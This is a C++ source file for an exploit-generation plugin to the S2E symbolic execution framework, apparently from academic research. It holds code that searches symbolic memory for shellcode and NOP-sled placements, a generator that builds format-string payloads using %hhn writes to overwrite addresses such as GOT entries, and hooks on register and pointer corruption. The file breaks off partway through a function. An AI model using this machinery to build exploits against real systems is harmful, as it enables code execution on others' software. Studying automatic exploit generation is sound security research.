/*
 * S2E Selective Symbolic Execution Framework
 *
 * Copyright (c) 2010, Dependable Systems Laboratory, EPFL
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 *       notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 *       notice, this list of conditions and the following disclaimer in the
 *       documentation and/or other materials provided with the distribution.
 *     * Neither the name of the Dependable Systems Laboratory, EPFL nor the
 *       names of its contributors may be used to endorse or promote products
 *       derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE DEPENDABLE SYSTEMS LABORATORY, EPFL BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * Currently maintained by:
 *    Vitaly Chipounov <vitaly.chipounov@epfl.ch>
 *    Volodymyr Kuznetsov <vova.kuznetsov@epfl.ch>
 *
 * All contributors are listed in S2E-AUTHORS file.
 *
 */
extern "C" {            
#include "config.h"     
#include "qemu-common.h"
}                       

#include "Exploit.h"
#include <s2e/S2E.h>
#include <s2e/ConfigFile.h>
#include <s2e/Utils.h>

#include <iostream>
#include <sstream>

#include <klee/Solver.h>
#include <s2e/S2EExecutor.h>    
#include <s2e/S2EExecutionState.h>

#include <iostream> 
#include <fstream> 
#include <vector> 
#include <utility> 

#include <sys/times.h>
#include <time.h>
#include <unistd.h>
#include <iomanip>

namespace s2e {
namespace plugins {

    bool ShellcodeAddrManager::IntervalAddrComp::operator() (const AddrInterval *lhs, const AddrInterval *rhs) const {
        return lhs->addr < rhs->addr;
    }

    bool ShellcodeAddrManager::IntervalNopComp::operator() (const AddrInterval *lhs, const AddrInterval *rhs) const {
        uint32_t llevel, rlevel;
        int lkey, rkey;
       
        lkey = lhs->maxNopLen();
        if(lkey != -1) {
            llevel = 1;
        }
        else {
            llevel = 0;
            lkey = lhs->addr;
        }

        rkey = rhs->maxNopLen();
        if(rkey != -1) {
            rlevel = 1;
        }
        else {
            rlevel = 0;
            rkey = rhs->addr;
        }

        if(llevel != rlevel) {
            return llevel > rlevel;
        }
        else {
            return lkey > rkey;
        }
    }

    ShellcodeAddrManager::ShellcodeAddrManager(S2EExecutionState *s, Exploit *e) {
        state = s;
        exploit = e;
        calledUpdate = false;
        shellcodeVector = exploit->getShellcode(exploit->m_shellcode);
    }

    ShellcodeAddrManager::~ShellcodeAddrManager() {
        AddrSetIter it;
        for(it=addrSet.begin(); it!=addrSet.end(); it++) {
            delInterval(*it);
        }
    }

    void ShellcodeAddrManager::addSymbolicRange(uint32_t start, uint32_t end) {
        assert(!calledUpdate && "Error: Add symbolic range after calling update");

        uint32_t intervalStart = start;
        uint32_t cumulatedNOP = 0;
        for(uint32_t i=start; i<=end; i++) {
            bool res = canBeValue(i, NOP_VALUE);
            if(res) {
                cumulatedNOP++;
            }
            else {
                if(cumulatedNOP != 0) {
                    /* Insert new interval */
                    uint32_t intervalLen = i-intervalStart;
                    insertInterval(intervalStart, intervalLen, cumulatedNOP, 0, 0);
                    intervalStart = i;
                }
                cumulatedNOP = 0;
            }
        }
        /* Insert last interval */
        uint32_t intervalLen = end-intervalStart+1;
        insertInterval(intervalStart, intervalLen, cumulatedNOP, 0, 0);
    }

    /* Make some adjustment if we know some interval is impossible to transfer control to */
    void ShellcodeAddrManager::updateUnreachable(uint32_t start, uint32_t end) {
        updateBadInterval(start, end, INTERVAL_UNREACHABLE);
    }

    /* Make some adjustment if we know some interval is impossible to be used as shellcode start */
    void ShellcodeAddrManager::updateUninsertable(uint32_t start, uint32_t end) {
        updateBadInterval(start, end, INTERVAL_UNINSERTABLE);
    }

    StartAddrProfile ShellcodeAddrManager::getAddrWithPossiblyMoreNOP() {
Restart:
        while(!nopSet.empty()) {
            NopSetIter it = nopSet.begin();
            AddrInterval *curr = *it;
            if(curr->maxNopLen() == -1)
                break;

            uint32_t shellcodeStart = curr->end()-curr->intervalLen(INTERVAL_UNINSERTABLE);

            /* minNop means if we want to insert shellcode at shellcodeStart, how many nops we need
               to attach in front of the shellcode */
            uint32_t minNop = curr->intervalLenAt(INTERVAL_UNREACHABLE, shellcodeStart-curr->addr);

            /* maxNop means if we want to insert shellcode at shellcodeStart, at most how many nops
               we can attach in front of the shellcode */
            uint32_t maxNop = curr->maxNopLen();

            /* Check the following condition 
                1. Memory[shellcodeStart] can be shellcodeVector[0] 
                2. Memory[shellcodeStart+1 can be shellcodeVector[1]
                ...

                And if not, update uninsertable interval
             */
            for(uint32_t i=0; i<shellcodeVector.size(); i++) {
                /* If we find an memory cell can't be a value, then this may be a more restricted cell
                   We check what value it can't be */
                if(!canBeValue(shellcodeStart+i, shellcodeVector[i])) {
                    uint32_t restrictedAddr = shellcodeStart+i;
                    assert(restrictedAddr>=shellcodeVector.size() && "Symbolic block contains a small address! Are you sure?");
                    for(uint32_t j=0; j<shellcodeVector.size(); j++) {
                        if(!canBeValue(restrictedAddr, shellcodeVector[i])) {
                            updateUninsertable(restrictedAddr-j, restrictedAddr-j);
                        }
                    }
                    goto Restart;
                }
            }

            if(canPutShellcodeAndMinNop(shellcodeStart, minNop)) {
                return StartAddrProfile(shellcodeStart, minNop, maxNop);
            }
            else {
                updateUninsertable(shellcodeStart, shellcodeStart);
            }
        }

        return StartAddrProfile(0, 0, 0);
    }

    void ShellcodeAddrManager::updateBadInterval(uint32_t start, uint32_t end, uint32_t interval) {
        calledUpdate = true;

        /*
            If we have current block status like below, and we want to add a new uninsertable interval:
          
            1     2 3 4           5   6         => Interval ID (Just for explaination, actually we don't have this field) 
           12    1516 17         23  25         => Start address of each interval
            V     V V V           V   V
           | | | | | | | | | | | | | | | | |    => Symbolic block
           |1|2|3| | |   |1|2|3|4|   |     |    => nopLen (The numbered cells can be NOP)
           |     | | |           |   |     |
           | |1|2|3| |       |1|2|3|4|     |    => uninsertableLen (The numbered cells can't be used as shellcode start)
           |     | | |           |   |     |
           |   |1|2|3|     |1|2|3|   |     |    => unreachableLen (The numbered cells aren't reachable by EIP)
           |     |x|x|           |xxx|     |    => The symblolic block is represented by 6 intervals, 3 will be deleted

                 |1|2|3|4|5|6|7|                => New uninsertable interval

            As you can see, current block status is represented by 6 intervals, the parameters is listed below:

            interval ID     1 2 3 4 5 6

            len             3 1 1 6 2 3
            nopLen          3 0 0 4 0 0
            uninsertableLen 2 3 0 2 4 0
            unreachableLen  1 2 3 3 0 0
            will be deleted   v v   v

            The new added uninsertable interval may connect two existing uninsertable intervals, we must find 
            the start and end of the merged uninsertable interval, that is, [13, 24]
         */

        /* Adjust start */
        AddrInterval *head = findLowerConnectedOrContains(start);
        if(head!=NULL && head->intervalLen(interval)!=0) {
            start = MIN(start, head->intervalStart(interval));
        }

        /* Adjust end */
        AddrInterval *tail = findHigherConnectedOrContains(end);
        if(tail!=NULL && tail->intervalLen(interval)!=0) {
            uint32_t intervalStart = tail->intervalStart(interval);
            assert(intervalStart!=0 && "Symbolic block contains 0x00000000! Are you sure?");
            if(intervalStart -1 <= end) {
                AddrSetIter it = tail->addrIter;
                while(it!=addrSet.end() && (*it)->intervalStart(interval)==intervalStart) {
                    end = (*it)->end();
                    it++;
                }
            }
        }

        /* Find the start interval */
        AddrSetIter it;
        head = findContainsOrLater(start);
        if(head != NULL) {
            it = head->addrIter;
        }
        else {
            it = addrSet.end();
        }
        /* The following loop will iterate all intervals that will be affected by this update */
        while(it!=addrSet.end() && (*it)->addr<=end) {
            AddrInterval *curr = (*it);
            uint32_t currEnd = curr->end();

            it++;

            unassociate(curr);

            uint32_t effectiveEnd = MIN(end, currEnd);
            AddrInterval *front=NULL, *back=NULL;
            if(effectiveEnd == currEnd) {
                front = curr;
            }
            else {
                assert(effectiveEnd!=0xffffffff && "Symbolic block contains 0xffffffff! Are you sure?");
                IntervalPair p = splitInterval(curr, effectiveEnd+1);
                front = p.first;
                back = p.second;
            }

            uint32_t effectiveLen = MIN(front->length, front->end()-start+1);
            front->setIntervalLen(interval, effectiveLen);
            updateInterval(front);
            if(back)
                updateInterval(back);
        }

        /* Do a final checkAndDelete */
        tail = findHigherConnectedOrBefore(end);
        if(tail != NULL) {
            if(tail->end() <= end) {
                checkAndDelete(tail);
            }
            else {
                if(tail->intervalLen(INTERVAL_NOP) == 0) {
                    assert(tail->addr>end && "This can't happen, something must wrong");
                    if(tail->addrIter != addrSet.begin()) {
                        AddrSetIter it = tail->addrIter;
                        it--;
                        checkAndDelete(*it);
                    }
                }
                else {
                    /* Find the NOP tail */
                    uint32_t nopStart = tail->intervalStart(INTERVAL_NOP);
                    AddrSetIter it = tail->addrIter;
                    while(it!=addrSet.end() && (*it)->intervalStart(INTERVAL_NOP)==nopStart)
                        it++;

                    if(it==addrSet.end() || 
                            (*it)->intervalLen(INTERVAL_NOP)==0 || 
                            (*it)->intervalStart(INTERVAL_NOP)!=nopStart)
                        it--;
                    checkAndDelete(*it);
                }
            }
        }
    }

    void ShellcodeAddrManager::unassociate(AddrInterval *interval) {
        if(interval->addrIter != addrSet.end())
            addrSet.erase(interval->addrIter);
        if(interval->nopIter != nopSet.end())
            nopSet.erase(interval->nopIter);
        interval->addrIter = addrSet.end();
        interval->nopIter = nopSet.end();

        for(int i=0; i<3; i++) {
            uint32_t intervalLen = interval->intervalLen(i);
            if(intervalLen > interval->length) {
                interval->setIntervalLen(i, interval->length);
            }
        }
    }

    /* 
       Insert new interval, and check whether it can be merged with neighbor intervals.
       This method can not be called after calling updateUnreachable/updateUninsertable, or error may occur 
    */
    void ShellcodeAddrManager::insertInterval(uint32_t addr, uint32_t length, uint32_t nopLen, uint32_t unreachableLen, uint32_t uninsertableLen) {
        AddrInterval *prev = NULL;
        AddrInterval *curr = newInterval(addr, length, nopLen, unreachableLen, uninsertableLen);
        AddrSetIter it = addrSet.lower_bound(curr);
        if(it != addrSet.begin()) {
            it--;
            prev = (*it);
            assert((prev->addr+prev->length <= curr->addr) && "Overlapping interval!");
        }

        if(prev != NULL) {
            checkMergeAndAddInterval(prev, curr);
        }
        else {
            addInterval(curr);
        }
    }

    ShellcodeAddrManager::AddrInterval* ShellcodeAddrManager::newInterval(uint32_t a, uint32_t l, uint32_t n, uint32_t ur, uint32_t ui) {
        AddrInterval *newOne = new AddrInterval(a, l, n, ur, ui);
        newOne->addrIter = addrSet.end();
        newOne->nopIter = nopSet.end();
        return newOne;
    }

    /* Split the interval to 2 part, [addr, mid) and [mid, addr+len) */
    ShellcodeAddrManager::IntervalPair ShellcodeAddrManager::splitInterval(AddrInterval *interval, uint32_t mid) {
        uint32_t frontIndex = mid-interval->addr-1;
        AddrInterval *front = newInterval(interval->addr,
                                          mid-interval->addr,
                                          interval->intervalLenAt(INTERVAL_NOP, frontIndex),
                                          interval->intervalLenAt(INTERVAL_UNREACHABLE, frontIndex),
                                          interval->intervalLenAt(INTERVAL_UNINSERTABLE, frontIndex));
        AddrInterval *back = newInterval(mid,
                                         interval->length-front->length,
                                         interval->intervalLen(INTERVAL_NOP),
                                         interval->intervalLen(INTERVAL_UNREACHABLE),
                                         interval->intervalLen(INTERVAL_UNINSERTABLE));
        delInterval(interval);

        unassociate(front);
        unassociate(back);

        return IntervalPair(front, back);
    }

    /*
       This function apply change of interval, and determine whether the changed interval can be deleted
       or merged with previous interval. Because an NOP area must be deleted together, every time we apply
       a interval change, we will check whether previous interval is an end of an NOP area, if so, check if 
       the NOP area can be deleted.
     */
    void ShellcodeAddrManager::updateInterval(AddrInterval *interval) {
        if(interval->addrIter != addrSet.end())
            addrSet.erase(interval->addrIter);
        if(interval->nopIter != nopSet.end())
            nopSet.erase(interval->nopIter);

        uint32_t nopLen = interval->intervalLen(INTERVAL_NOP);
        if(nopLen < interval->length) {
            uint32_t badIntervalLen = MAX(interval->intervalLen(INTERVAL_UNREACHABLE),
                                          interval->intervalLen(INTERVAL_UNINSERTABLE));
            if(badIntervalLen > nopLen) {
                if(nopLen == 0) {
                    if(badIntervalLen < interval->length) {
                        IntervalPair p = splitInterval(interval, interval->addr+interval->length-badIntervalLen);
                        updateIntervalInternal(p.first);
                        updateIntervalInternal(p.second);
                        return;
                    }
                }
                else {
                    IntervalPair p = splitInterval(interval, interval->addr+interval->length-nopLen);
                    updateInterval(p.first);
                    updateIntervalInternal(p.second);
                    return;
                }
            }
        }

        updateIntervalInternal(interval);
    }

    void ShellcodeAddrManager::updateIntervalInternal(AddrInterval *interval) {
        /* Find the previous interval, and check whether current interval can be deleted */
        AddrInterval *prev = findPrev(interval->addr);
        if(interval->intervalLen(INTERVAL_NOP)==0 && 
           (interval->intervalLen(INTERVAL_UNREACHABLE)!=0 || interval->intervalLen(INTERVAL_UNINSERTABLE)!=0)) {
            delete interval;
            interval = NULL;
        }

        /* Check if prev could be deleted or merged */
        if(prev) {
            if(interval!=NULL && prev->addr+prev->length==interval->addr) {
                if(prev->intervalLen(INTERVAL_NOP)!=0 && interval->intervalLenAt(INTERVAL_NOP, 0)!=0) {
                    checkMergeAndAddInterval(prev, interval);
                    return;
                }
            }

            checkAndDelete(prev);
        }

        if(interval)
            addInterval(interval);
    }

    /* Check if the entire NOP area ending with prev can be deleted, if so, delete it */
    void ShellcodeAddrManager::checkAndDelete(AddrInterval *prev) {
        bool mustDelete = false;
        if(prev->intervalLen(INTERVAL_NOP) != 0) {
            if(prev->intervalLen(INTERVAL_NOP) <= prev->intervalLen(INTERVAL_UNINSERTABLE) ||
               prev->intervalLen(INTERVAL_NOP) <= prev->intervalLen(INTERVAL_UNREACHABLE)) {
                mustDelete = true;
            }
            else if(prev->intervalLen(INTERVAL_UNINSERTABLE) != 0) {
                uint32_t uninsertableStart = prev->intervalStart(INTERVAL_UNINSERTABLE);
                assert(uninsertableStart && "Symbolic block contains 0x00000000! Are you sure?");
                AddrInterval *insertable = findContains(uninsertableStart-1);
                assert(insertable && "Some NOP area may be deleted individually");
                uint32_t insertableIndex = uninsertableStart-1-insertable->addr;
                uint32_t maxNop = insertable->intervalLenAt(INTERVAL_NOP, insertableIndex);
                uint32_t minNop = insertable->intervalLenAt(INTERVAL_UNREACHABLE, insertableIndex);
                if(minNop!=0 && maxNop<=minNop) {
                    mustDelete = true;
                }
            }
        }

        /* Delete the entire nop area */
        if(mustDelete) {
            uint32_t nopStart = prev->intervalStart(INTERVAL_NOP);
            AddrSetIter it = prev->addrIter;
            while((*it)->end() >= nopStart) {
                if((*it)->addr >= nopStart) {
                    if(it == addrSet.begin()) {
                        delInterval((*it));
                        break;
                    }
                    else {
                        AddrInterval *interval = *it;
                        it--;
                        delInterval(interval);
                    }
                }
                else {
                    uint32_t splitPoint = nopStart;
                    if((*it)->intervalLen(INTERVAL_UNREACHABLE)) {
                        splitPoint = MIN(splitPoint, (*it)->intervalStart(INTERVAL_UNREACHABLE));
                    }
                    if((*it)->intervalLen(INTERVAL_UNINSERTABLE)) {
                        splitPoint = MIN(splitPoint, (*it)->intervalStart(INTERVAL_UNINSERTABLE));
                    }
                    splitPoint = MAX(splitPoint, (*it)->addr);
                    assert(splitPoint==nopStart && "This can't happen, something must wrong");

                    /* The first must be non-NOP area, so no update needed */
                    IntervalPair p = splitInterval(*it, splitPoint);
                    addInterval(p.first);
                    delete p.second;

                    break;
                }
            }
        }
    }

    void ShellcodeAddrManager::checkMergeAndAddInterval(AddrInterval *prev, AddrInterval *curr) {
        if(prev->addr+prev->length == curr->addr) {
            bool canMerge = true;
            for(int i=0; i<3; i++) {
                assert(curr->intervalLenAt(i, 0)<2 && "Incorrect interval length!");
                if(prev->intervalLen(i) != 0) {
                    if(curr->intervalLenAt(i, 0) != 0) {
                        curr->setIntervalLen(i, prev->intervalLen(i)+curr->intervalLen(i));
                    }
                    else {
                        canMerge = false;
                    }
                }
            }

            if(canMerge) {
                AddrInterval *merged = newInterval(prev->addr,
                                                   prev->length+curr->length,
                                                   curr->intervalLen(INTERVAL_NOP),
                                                   curr->intervalLen(INTERVAL_UNREACHABLE),
                                                   curr->intervalLen(INTERVAL_UNINSERTABLE));
                delInterval(prev);
                delInterval(curr);
                addInterval(merged);
            }
            else {
                addInterval(curr);
            }
        }
    }

    void ShellcodeAddrManager::addInterval(AddrInterval *interval) {
        interval->addrIter = addrSet.insert(interval);
        interval->nopIter = nopSet.insert(interval);
    }

    void ShellcodeAddrManager::delInterval(AddrInterval *interval) {
        if(interval->addrIter != addrSet.end())
            addrSet.erase(interval->addrIter);
        if(interval->nopIter != nopSet.end())
            nopSet.erase(interval->nopIter);
        delete interval;
    }

    ShellcodeAddrManager::AddrInterval* ShellcodeAddrManager::findPrev(uint32_t addr) {
        AddrInterval key(addr, 1, 0, 0, 0);
        AddrSetIter it = addrSet.lower_bound(&key);
        if(it != addrSet.begin()) {
            it--;
            return *it;
        }
        else {
            return NULL;
        }
    }

    ShellcodeAddrManager::AddrInterval* ShellcodeAddrManager::findContains(uint32_t addr) {
        AddrInterval key(addr, 1, 0, 0, 0);
        AddrSetIter it = addrSet.lower_bound(&key);
        if(it!=addrSet.end() && (*it)->addr==addr)
            return *it;
        if(it != addrSet.begin()) {
            it--;
            if((*it)->end() >= addr)
                return (*it);
        }
        return NULL;
    }

    ShellcodeAddrManager::AddrInterval* ShellcodeAddrManager::findContainsOrLater(uint32_t addr) {
        AddrInterval *candidate = NULL;
        AddrInterval key(addr, 1, 0, 0, 0);
        AddrSetIter it = addrSet.lower_bound(&key);
        if(it != addrSet.end()) {
            if((*it)->addr == addr)
                return *it;
            candidate = *it;
        }
        if(it != addrSet.begin()) {
            it--;
            if((*it)->end() >= addr) {
                candidate = *it;
            }
        }

        return candidate;
    }

    ShellcodeAddrManager::AddrInterval* ShellcodeAddrManager::findLowerConnectedOrContains(uint32_t addr) {
        AddrInterval key(addr, 1, 0, 0, 0);
        AddrInterval *candidate = NULL;
        AddrSetIter it = addrSet.lower_bound(&key);
        if(it!=addrSet.end() && (*it)->addr==addr) {
            candidate = *it;
        }
        if(it != addrSet.begin()) {
            it--;
            assert((*it)->end()!=0xffffffff && "Symbolic block contains 0xffffffff! Are you sure?");
            if((*it)->end()+1 >= addr) {
                candidate = *it;
            }
        }

        return candidate;
    }

    ShellcodeAddrManager::AddrInterval* ShellcodeAddrManager::findHigherConnectedOrContains(uint32_t addr) {
        AddrInterval key(addr, 1, 0, 0, 0);
        AddrSetIter it = addrSet.upper_bound(&key);
        if(it!=addrSet.end() && (*it)->addr-1==addr) {
            return *it;
        }
        if(it != addrSet.begin()) {
            it--;
            if((*it)->end() >= addr) {
                return *it;
            }
        }

        return NULL;
    }

    ShellcodeAddrManager::AddrInterval* ShellcodeAddrManager::findHigherConnectedOrBefore(uint32_t addr) {
        AddrInterval key(addr, 1, 0, 0, 0);
        AddrSetIter it = addrSet.upper_bound(&key);
        if(it!=addrSet.end() && (*it)->addr-1==addr) {
            return *it;
        }
        if(it != addrSet.begin()) {
            it--;
            return *it;
        }

        return NULL;
    }

    bool ShellcodeAddrManager::canBeValue(uint32_t addr, uint8_t value) {
        klee::ref<klee::Expr> byte = state->readMemory8(addr);
        klee::ref<klee::Expr> canBe = klee::EqExpr::create(byte, 
                klee::ConstantExpr::create(value, klee::Expr::Int8));
        bool res = exploit->mayBeTrue(state, canBe);
        return res;
    }

    bool ShellcodeAddrManager::canPutShellcodeAndMinNop(uint32_t shellcodeStart, uint32_t minNop) {
        assert(shellcodeStart<0xffffffff-shellcodeVector.size()+1 && "Symbolic block contain a high address! Are you sure?");

        klee::ref<klee::Expr> shellcodeConstraint = exploit->getShellcodeConstraint(state, shellcodeStart);
        klee::ref<klee::Expr> nopConstraint = exploit->getNopConstraint(state, shellcodeStart, minNop);
        klee::ref<klee::Expr> shellcodeAndNopConstraint = klee::AndExpr::create(shellcodeConstraint, nopConstraint);
        bool res = exploit->mayBeTrue(state, shellcodeAndNopConstraint);
        return res;
    }

    uint8_t* FMTGenerator::itoa(uint8_t *ptr, uint32_t num) {
        uint32_t power = 10;
        while(power <= num) {
            power = power * 10;
        }
        power = power / 10;

        while(power != 0) {
            uint32_t digit = num / power;
            num = num % power;
            power = power / 10;

            *ptr = digit + '0';
            ptr++;
        }

        return ptr;
    }

    uint8_t* FMTGenerator::cat(uint8_t *ptr, const char *str) {
        for(int i=0; str[i]!=0; i++) {
            *ptr = str[i];
            ptr++;
        }

        return ptr;
    }

    /*
       Output specific formatting option to increase the length of printed string
     */
    uint8_t* FMTGenerator::addLength(uint8_t *ptr, uint32_t len) {
        if(len == 0)
            return ptr;

        ptr = cat(ptr, "%");

        if(len == 1) {
            ptr = cat(ptr, "c");
        }
        else {
            ptr = itoa(ptr, len);
            if(len >= 2 && len < 4) {
                ptr = cat(ptr, "hhx");
            }
            else if(len >= 4 && len < 8) {
                ptr = cat(ptr, "hx");
            }
            else {
                ptr = cat(ptr, "x");
            }
        }

        return ptr;
    }

    /*
        targetAddr:     The address in vulnerable program that we want to overwritten
        targetValue:    The value that we want to write to targetAddr
        dollarOffset:   The value used in the $ style formatting that we can access the first full word of the format string
        wordOffset:     The offset between the head of format string and the head of first full accessable word
        fmtOffset:      The displacement between the head of format string and the generated fmt

        This function will generate format string with the %hhn formatting which allow us to overwritten only one byte

        The head of format string
        |    The first full accessable word by %<dollarOffset>$x formatting
        |    |
        |    V
        V  |--|
        ***WORD*****FMTFMTFMTFMTFMT****** => format string of printf/sprintf/... in vulnerable function
        |----------||-------------|
        |-|  ^             ^
         ^   |             |
         |   fmtOffset     Generated fmt
         wordOffset
     */
    char* FMTGenerator::genFmt(uint32_t targetAddr, uint32_t targetValue, uint32_t dollarOffset, uint32_t wordOffset, uint32_t fmtOffset) {
        static char Fmt[MAX_FMT_LENGTH];

        /* Need to modify: fmtOffset can be smaller than wordOffset */
        uint32_t fwOffset;
        if(fmtOffset >= wordOffset) {
            uint32_t wfOffset = fmtOffset - wordOffset;
            fwOffset = wfOffset % FMT_OFFSET_WORD_SIZE;
            fwOffset = (fwOffset == 0 ? 0 : FMT_OFFSET_WORD_SIZE-fwOffset);
            dollarOffset = dollarOffset + (wfOffset+fwOffset)/FMT_OFFSET_WORD_SIZE;
        }
        else {
            fwOffset = wordOffset-fmtOffset;
        }

        uint8_t *ptr = (uint8_t*)(&Fmt[0]);

        /* Offset between format string head and ptr is fmtOffset */

        for(uint32_t i=0; i<fwOffset; i++) {
            *ptr = 'x';
            ptr++;
        }

        /* Offset between format string head and ptr is fmtOffset+fwOffset */

        uint8_t* addrPtr = (uint8_t*)&targetAddr;
        for(int i=0; i<4; i++) {
            for(int j=0; j<FMT_OFFSET_WORD_SIZE; j++) {
                if(j < 4) {
                    uint8_t byte = *(addrPtr+j);
                    if(byte == 0 || byte == '%') {
                        assert(false && "GOT address contains 0 or '%'(0x25)!");
                        return NULL;
                    }
                    *ptr = byte;
                }
                else {
                    *ptr = 'a';
                }
                ptr++;
            }
            targetAddr++;
        }

        /* Offset between format string head and ptr is fmtOffset+fwOffset+FMT_OFFSET_WORD_SIZE*4 */

        /* For now, the printed string length is curLength */
        uint32_t curLength = fmtOffset + fwOffset + FMT_OFFSET_WORD_SIZE*4;

        uint8_t* valuePtr = (uint8_t*)&targetValue;
        uint32_t lengthNeeded[4];
        uint32_t correspondDollarOffset[4];
        for(int i=0; i<4; i++) {
            uint32_t byte = *(valuePtr+i);
            lengthNeeded[i] = (byte >= curLength ? byte : byte+256);
            correspondDollarOffset[i] = dollarOffset+i;
        }

        /* Sort by lengthNeeded */
        for(int i=0; i<4; i++) {
            int min = i;
            for(int j=i; j<4; j++) {
                if(lengthNeeded[j] < lengthNeeded[min]) {
                    min = j;
                }
            }
            uint32_t temp = lengthNeeded[i];
            lengthNeeded[i] = lengthNeeded[min];
            lengthNeeded[min] = temp;
            temp = correspondDollarOffset[i];
            correspondDollarOffset[i] = correspondDollarOffset[min];
            correspondDollarOffset[min] = temp;
        }

        /* Manipulate the printed length and %hhn to modify targetAddr */
        for(int i=0; i<4; i++) {
            int lengthToPrint = lengthNeeded[i]-curLength;
            ptr = addLength(ptr, lengthToPrint);

            curLength = curLength + lengthToPrint;

            ptr = cat(ptr, "%");
            ptr = itoa(ptr, correspondDollarOffset[i]);
            ptr = cat(ptr, "$hhn");
        }

        ptr = cat(ptr, "\n");
        *ptr = 0;

        return Fmt;
    }

    S2E_DEFINE_PLUGIN(Exploit, "Expoit S2E plugin", "",);

    void Exploit::initialize() {
        m_exploitType = s2e()->getConfig()->getInt(getConfigKey() + ".Type");
        m_shellcode = s2e()->getConfig()->getString(getConfigKey() + ".Shellcode");
        m_shellcodeVector = getShellcode(m_shellcode);
        m_GOTAddress = s2e()->getConfig()->getInt(getConfigKey() + ".GOTAddress");

        std::cout << "* Exploit * Exploit type : " << m_exploitType << std::endl;

        s2e()->getCorePlugin()->onCorruptReg.connect(
                sigc::mem_fun(*this, &Exploit::onCorruptReg));

        s2e()->getCorePlugin()->onCorruptFmt.connect(
                sigc::mem_fun(*this, &Exploit::onCorruptFmt));

        s2e()->getCorePlugin()->onCorruptPtr.connect(
                sigc::mem_fun(*this, &Exploit::onCorruptPtr));

        s2e()->getCorePlugin()->onSetInputRange.connect(
                sigc::mem_fun(*this, &Exploit::onSetInputRange));

        s2e()->getCorePlugin()->onSetSymbolicAddr.connect(
                sigc::mem_fun(*this, &Exploit::onSetSymbolicAddr));

        s2e()->getCorePlugin()->onDumpSymbolicBlocks.connect(
                sigc::mem_fun(*this, &Exploit::onDumpSymbolicBlocks));

        m_prevNopSize = -1;
        m_inputAddr = 0;
        m_inputSize = 0;

        m_currEGState = NULL;
        m_currEGStateIsConcolicMode = false;
    }

    void Exploit::enterExploitGenStage(S2EExecutionState *state) {
        /* The timeout mechanism in fillAxisRecursive make the assertion may be false, so
           we remove it. */
        // assert(m_currEGState == NULL);
        m_currEGState = state;
        m_currEGStateIsConcolicMode = state->isConcolicMode;
        state->isConcolicMode = false;

        state->middle = times(&(state->t_middle));
        long tps = sysconf(_SC_CLK_TCK); 
        s2e()->getWarningsStream(state) << "Explore time: " << std::fixed << std::setprecision(5) << (float)(state->middle - state->start)/tps << std::endl;

#ifdef __MHHUANG_MEASURE_TIME__
        state->printAllStat();
        onDumpSymbolicBlocks(state);
#endif

#ifdef __MHHUANG_MEASURE_TIME__
        state->constraints.saveAllConstraints();

        uint32_t conSize = s2e()->getExecutor()->getConstraintSize(*state);
        if(conSize > 1024*1024) {
            s2e()->getWarningsStream(state) << "Constraint size: " << ((float)conSize)/(1024.0*1024.0) << " MB" << std::endl;
        }
        else if(conSize > 1024) {
            s2e()->getWarningsStream(state) << "Constraint size: " << ((float)conSize)/(1024.0) << " KB" << std::endl;
        }
        else {
            s2e()->getWarningsStream(state) << "Constraint size: " << conSize << " Bytes" << std::endl;
        }
#endif

        m_mappedAddrSet = searchMappedBlock(state);
        m_symSizeSet = searchExceptFutureStack(state);
        m_symAddrSet = BlockAddrSet(m_symSizeSet.begin(), m_symSizeSet.end());

        m_jmpAddrSet.clear();

        /* Use different redirection strategies only when no pseudo variables,
           because solving with pseudo variables is time consuming */
#ifndef __KS_MHHUANG_SYM_READ__
        for(BlockAddrSetIter it=m_symAddrSet.begin(); it!=m_symAddrSet.end(); it++) {
            uint32_t currStart = it->addr;
            uint32_t currEnd = it->addr+it->size-1;
            for(uint32_t addr=currStart; addr<=currEnd; addr++) {
                klee::ref<klee::Expr> byte = state->readMemory8(addr);
                klee::ref<klee::Expr> jmpOp = klee::EqExpr::create(byte, klee::ConstantExpr::create(0xe9, klee::Expr::Int8));
                if(mayBeTrue(state, jmpOp)) {
                    bool canUse = true;
                    for(int i=1; i<=4; i++) {
                        byte = state->readMemory8(addr+i);
                        if(byte.get()==NULL || isa<klee::ConstantExpr>(byte)) {
                            canUse = false;
                            break;
                        }
                    }
                    if(canUse)
                        addBlockRange(m_jmpAddrSet, addr, addr);
                }
            }
        }
#endif

        s2e()->getWarningsStream(state) << "Analysis of all blocks finished" << std::endl;
    }

    void Exploit::leaveExploitGenStage(S2EExecutionState *state) {
        assert(m_currEGState == state);
        state->isConcolicMode = m_currEGStateIsConcolicMode;
        m_currEGState = NULL;
        m_currEGStateIsConcolicMode = false;
    }

    klee::ref<klee::Expr> Exploit::getShellcodeConstraint(S2EExecutionState *state, uint32_t shellcodeStart) {
        klee::ref<klee::Expr> shellcodeConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);

        for(uint32_t i=0; i<m_shellcodeVector.size(); i++) {
            klee::ref<klee::Expr> byte =  klee::EqExpr::create(state->readMemory8(shellcodeStart+i), 
                                                    klee::ConstantExpr::create(m_shellcodeVector[i], klee::Expr::Int8));
            shellcodeConstraint = klee::AndExpr::create(shellcodeConstraint, byte);;
        }

        return shellcodeConstraint;
    }

    klee::ref<klee::Expr> Exploit::getNopConstraint(S2EExecutionState *state, uint32_t shellcodeStart, uint32_t nopLen) {
